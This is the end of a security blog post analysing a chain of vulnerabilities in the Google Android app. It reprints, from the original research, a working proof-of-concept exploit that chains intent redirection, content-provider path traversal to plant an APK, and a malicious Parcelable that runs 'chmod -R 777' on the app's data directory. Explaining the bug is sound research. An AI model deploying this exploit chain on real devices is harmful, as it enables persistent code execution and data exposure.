<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">Pair</span><span class="o">&lt;</span><span class="n">d</span><span class="o">,</span> <span class="n">Uri</span><span class="o">&gt;</span> <span class="nf">b</span><span class="o">(</span><span class="n">Uri</span> <span class="n">uri</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Pair</span> <span class="n">pair</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">uri</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ArrayList</span> <span class="n">arrayList</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">());</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">arrayList</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="n">2</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">//parse Uri
</span><span class="c1"></span>                <span class="n">pair</span> <span class="o">=</span> <span class="n">Pair</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="n">build</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">f186855a</span><span class="o">.</span><span class="na">booleanValue</span><span class="o">())</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">valueOf3</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">uri</span><span class="o">);</span>
                <span class="n">StringBuilder</span> <span class="n">sb2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">valueOf3</span><span class="o">).</span><span class="na">length</span><span class="o">()</span> <span class="o">+</span> <span class="n">13</span><span class="o">);</span>
                <span class="n">sb2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;Invalid URI: &#34;</span><span class="o">);</span>
                <span class="n">sb2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">valueOf3</span><span class="o">);</span>
                <span class="n">Log</span><span class="o">.</span><span class="na">w</span><span class="o">(</span><span class="s">&#34;DynamicHostProvider&#34;</span><span class="o">,</span> <span class="n">sb2</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">pair</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// in a the d object is generated.
</span><span class="c1"></span>            <span class="k">return</span> <span class="n">Pair</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">a</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">pair</span><span class="o">.</span><span class="na">first</span><span class="o">),</span> <span class="o">(</span><span class="n">Uri</span><span class="o">)</span> <span class="n">pair</span><span class="o">.</span><span class="na">second</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">String</span> <span class="n">valueOf4</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">valueOf4</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">!=</span> <span class="n">0</span> <span class="o">?</span> <span class="s">&#34;Invalid uri: &#34;</span><span class="o">.</span><span class="na">concat</span><span class="o">(</span><span class="n">valueOf4</span><span class="o">)</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">&#34;Invalid uri: &#34;</span><span class="o">));</span>
    <span class="o">}</span>
</code></pre></div><p>a is an abstract method from com.google.android.libraries.aw.g:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kd">abstract</span> <span class="n">d</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">str</span><span class="o">);</span>
</code></pre></div><p>We need to find which class returns the &ldquo;com.google.android.apps.gsa.staticplugins.g.c.b&rdquo; class, but it gets complicated to trace statically this code. The alternative in this case is to run the application and trace it.</p>
<p><em>NOTE: The remaining analysis on this section path will be done in a future due to limitations on environment.</em></p>
<h3 id="google-play-command-execution">Google play command execution</h3>
<p>After the content provider is sent to the client, the attacker writes a file in a particular folder. This triggers the a ClassLoader (that vulnerability can be seen in more detail on the following blogpost <a href="https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/)">https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/)</a>.</p>
<p>After the three steps are executed an attacker needs to send any Intent message to a component that deserializes the payload. Android deserializes all the objects sent in an Intent as a parameter when any extra of the it is required, like in the following example:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
<span class="n">String</span> <span class="n">expected</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">&#34;EXPECTED&#34;</span><span class="o">);</span>
</code></pre></div><p>You can read more about this bug in the following post: <a href="https://securitylab.github.com/research/android-deserialization-vulnerabilities/">https://securitylab.github.com/research/android-deserialization-vulnerabilities/</a></p>
<p>In this case the attacker would send as a parameter a deserializable class that would execute code on the method that parses it. In this case the attacker knows which class is vulnerable because they forced the application to load it by abusing the Google play command bug.</p>
<p>The following payload is shown in the original post:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="n">Activity</span> <span class="o">{</span>
   <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">APP</span> <span class="o">=</span> <span class="s">&#34;com.google.android.googlequicksearchbox&#34;</span><span class="o">;</span>

   <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
       <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
       <span class="n">handle</span><span class="o">(</span><span class="n">getIntent</span><span class="o">());</span>
   <span class="o">}</span>

   <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onNewIntent</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
       <span class="kd">super</span><span class="o">.</span><span class="na">onNewIntent</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
       <span class="n">handle</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
   <span class="o">}</span>

   <span class="kd">private</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
       <span class="k">if</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">()))</span> <span class="o">{</span>
           <span class="k">try</span> <span class="o">{</span>
                <span class="c1">//3- upload the APK with the malicious class in the victim application
</span><span class="c1"></span>                <span class="c1">//the inclusion of the file in the ClassLoader is due to the third vulnerability in the chain
</span><span class="c1"></span>               <span class="n">InputStream</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">getApplicationInfo</span><span class="o">().</span><span class="na">sourceDir</span><span class="o">);</span>
               <span class="n">OutputStream</span> <span class="n">o</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openOutputStream</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">());</span>
               <span class="n">IOUtils</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">o</span><span class="o">);</span>
               <span class="n">i</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
               <span class="n">o</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
           <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
           <span class="o">}</span>
           <span class="n">start</span><span class="o">();</span>
       <span class="o">}</span>
       <span class="k">else</span> <span class="o">{</span>
            <span class="c1">//2- abusing content provider and path traversal (see the escaped path ..%2Fsplitcompat%2F)
</span><span class="c1"></span>            <span class="c1">//this will be called by the victim application automatically due to the intent redirection bug that we already analyzed
</span><span class="c1"></span>           <span class="n">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">&#34;content://com.google.android.googlequicksearchbox.CommonContentProvider/assist.com.google.android.apps.gsa.staticplugins.assist.screenshot.ScreenshotProvider/1/ScreenAssistScreenshots/..%2Fsplitcompat%2F&#34;</span> <span class="o">+</span> <span class="n">getVersionCode</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;%2Fverified-splits%2Fconfig.test.apk&#34;</span><span class="o">);</span>
           <span class="n">Intent</span> <span class="n">next</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">,</span> <span class="n">uri</span><span class="o">);</span>
           <span class="n">next</span><span class="o">.</span><span class="na">setClass</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">getClass</span><span class="o">());</span>
           <span class="n">next</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span> <span class="o">|</span> <span class="n">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_WRITE_URI_PERMISSION</span><span class="o">);</span>

           <span class="c1">//1- abusing the intent redirection in SearchActivity
</span><span class="c1"></span>           <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">&#34;android.intent.action.ASSIST&#34;</span><span class="o">);</span>
           <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">APP</span><span class="o">,</span> <span class="s">&#34;com.google.android.googlequicksearchbox.SearchActivity&#34;</span><span class="o">);</span>
           <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;KEY_HANDOVER_THROUGH_VELVET&#34;</span><span class="o">,</span> <span class="n">next</span><span class="o">);</span>
           <span class="n">startActivity</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
       <span class="o">}</span>
   <span class="o">}</span>

   <span class="kd">private</span> <span class="kt">int</span> <span class="nf">getVersionCode</span><span class="o">()</span> <span class="o">{</span>
       <span class="k">try</span> <span class="o">{</span>
           <span class="k">return</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">APP</span><span class="o">,</span> <span class="n">0</span><span class="o">).</span><span class="na">versionCode</span><span class="o">;</span>
       <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
           <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
       <span class="o">}</span>
   <span class="o">}</span>

   <span class="kd">private</span> <span class="kt">void</span> <span class="nf">start</span><span class="o">()</span> <span class="o">{</span> 
        <span class="c1">//4- after the class is loaded, any component that gets an extra from the intent will deserialize the EvilParcelable class. This is pretty easy to find in any application
</span><span class="c1"></span>       <span class="n">Intent</span> <span class="n">i</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="s">&#34;com.google.android.gms.udc.action.FACS_CACHE_UPDATED_EXPLICIT&#34;</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">APP</span><span class="o">,</span> <span class="s">&#34;com.google.android.apps.search.googleapp.permissions.udcdataservice.facs.FacsBroadcastReceiver_Receiver&#34;</span><span class="o">);</span>
       <span class="n">i</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">&#34;evil&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">EvilParcelable</span><span class="o">());</span>
       <span class="n">sendBroadcast</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
   <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>And the EvilParcelable class:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilParcelable</span> <span class="kd">implements</span> <span class="n">Parcelable</span> <span class="o">{</span>
   <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Parcelable</span><span class="o">.</span><span class="na">Creator</span><span class="o">&lt;</span><span class="n">EvilParcelable</span><span class="o">&gt;</span> <span class="n">CREATOR</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Parcelable</span><span class="o">.</span><span class="na">Creator</span><span class="o">&lt;</span><span class="n">EvilParcelable</span><span class="o">&gt;()</span> <span class="o">{</span>
       <span class="kd">public</span> <span class="n">EvilParcelable</span> <span class="nf">createFromParcel</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcel</span> <span class="n">parcel</span><span class="o">)</span> <span class="o">{</span>
           <span class="n">exploit</span><span class="o">();</span>
           <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
       <span class="o">}</span>

       <span class="kd">public</span> <span class="n">EvilParcelable</span><span class="o">[]</span> <span class="nf">newArray</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">)</span> <span class="o">{</span>
           <span class="n">exploit</span><span class="o">();</span>
           <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
       <span class="o">}</span>

       <span class="kd">private</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="o">()</span> <span class="o">{</span>
           <span class="k">try</span> <span class="o">{</span>
               <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod -R 777 /data/data/&#34;</span> <span class="o">+</span> <span class="n">MainActivity</span><span class="o">.</span><span class="na">APP</span><span class="o">).</span><span class="na">waitFor</span><span class="o">();</span>
           <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="o">(</span><span class="n">th</span><span class="o">);</span>
           <span class="o">}</span>
       <span class="o">}</span>
   <span class="o">};</span>

   <span class="kd">public</span> <span class="kt">int</span> <span class="nf">describeContents</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="n">0</span><span class="o">;</span> <span class="o">}</span>
   <span class="kd">public</span> <span class="kt">void</span> <span class="nf">writeToParcel</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">os</span><span class="o">.</span><span class="na">Parcel</span> <span class="n">parcel</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">)</span> <span class="o">{}</span>
<span class="o">}</span>
</code></pre></div><p>This is an incredible bug, using a chain of three different vulnerabilities to find a persistent remote code execution. It is worth understanding the whole chain because it uses different techniques that are commonly find in many applications. Congratulations to the Oversecured team that found it!</p>

        </div>

        
        
      </div>
    </div>
  </div>
</section>



<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-3 col-sm-6 mb-5">
        <h6 class="mb-4">Contact Me</h6>
        <ul class="list-unstyled">
          <li class="mb-3"><i
                class="ti-twitter mr-3 text-primary"></i>@warlockk87</li>
          <li class="mb-3"><i class="ti-location-pin mr-3 text-primary"></i>Buenos Aires, Argentina</li>
          <li class="mb-3"><a class="text-dark" href="mailto:cmrodriguez.mobile@gmail.com"><i
                class="ti-email mr-3 text-primary"></i>cmrodriguez.mobile@gmail.com</a>
          </li>
        </ul>
      </div>
      <div class="col-lg-3 col-sm-6 mb-5">
        <h6 class="mb-4">Social Contacts</h6>
        <ul class="list-unstyled">
          
          <li class="mb-3"><a class="text-dark" href="https://twitter.com/warlockk87">twitter</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://github.com/CesarMRodriguez">github</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://www.linkedin.com/in/cesar-mario-rodriguez/">linkedin</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://www.instagram.com/cesarm_rodriguez/">instagram</a></li>
          
        </ul>
      </div>
      <div class="col-lg-3 col-sm-6 mb-5">
        <h6 class="mb-4">Categories</h6>
        <ul class="list-unstyled">
          <li class="mb-3"><a class="text-dark"
              href="/categories/android">Android</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/automation">Automation</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/bug">Bug</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/challenge">Challenge</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/ctf">Ctf</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/frida">Frida</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/http">Http</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/https">Https</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/misc">Misc</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/pixeldungeon">Pixeldungeon</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/root-detection">Root detection</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/sqlite">Sqlite</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/tcp">Tcp</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/udp">Udp</a>
          </li>
          <li class="mb-3"><a class="text-dark"
              href="/categories/websocket">Websocket</a>
          </li>
        </ul>
      </div>
      <div class="col-lg-3 col-sm-6 mb-5">
        <h6 class="mb-4">Quick Links</h6>
        <ul class="list-unstyled">
          
          <li class="mb-3"><a class="text-dark" href="https://cmrodriguez.me/about">About</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://cmrodriguez.me/blog">Post</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://cmrodriguez.me/guides">Guides</a></li>
          
          <li class="mb-3"><a class="text-dark" href="https://cmrodriguez.me/contact">Contact</a></li>
          
        </ul>
      </div>
      <div class="col-12 border-top py-4 text-center">
        | copyright © 2020 <a href="https://cmrodriguez.me">Cesar Rodriguez</a> All Rights Reserved |
      </div>
    </div>
  </div>
</footer>

<script>
  var indexURL = "https://cmrodriguez.me/index.json"
</script>

<!-- JS Plugins -->

<script src="https://cmrodriguez.me/plugins/jQuery/jquery.min.js"></script>

<script src="https://cmrodriguez.me/plugins/bootstrap/bootstrap.min.js"></script>

<script src="https://cmrodriguez.me/plugins/slick/slick.min.js"></script>

<script src="https://cmrodriguez.me/plugins/venobox/venobox.min.js"></script>

<script src="https://cmrodriguez.me/plugins/search/fuse.min.js"></script>

<script src="https://cmrodriguez.me/plugins/search/mark.js"></script>

<script src="https://cmrodriguez.me/plugins/search/search.js"></script>

<!-- Main Script -->

<script src="https://cmrodriguez.me/js/script.min.js"></script>
<!-- google analitycs -->
<script>
  (function (i, s, o, g, r, a, m) {
    i['GoogleAnalyticsObject'] = r;
    i[r] = i[r] || function () {
      (i[r].q = i[r].q || []).push(arguments)
    }, i[r].l = 1 * new Date();
    a = s.createElement(o),
      m = s.getElementsByTagName(o)[0];
    a.async = 1;
    a.src = g;
    m.parentNode.insertBefore(a, m)
  })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
  ga('create', 'Your ID', 'auto');
  ga('send', 'pageview');
</script></body>
</html>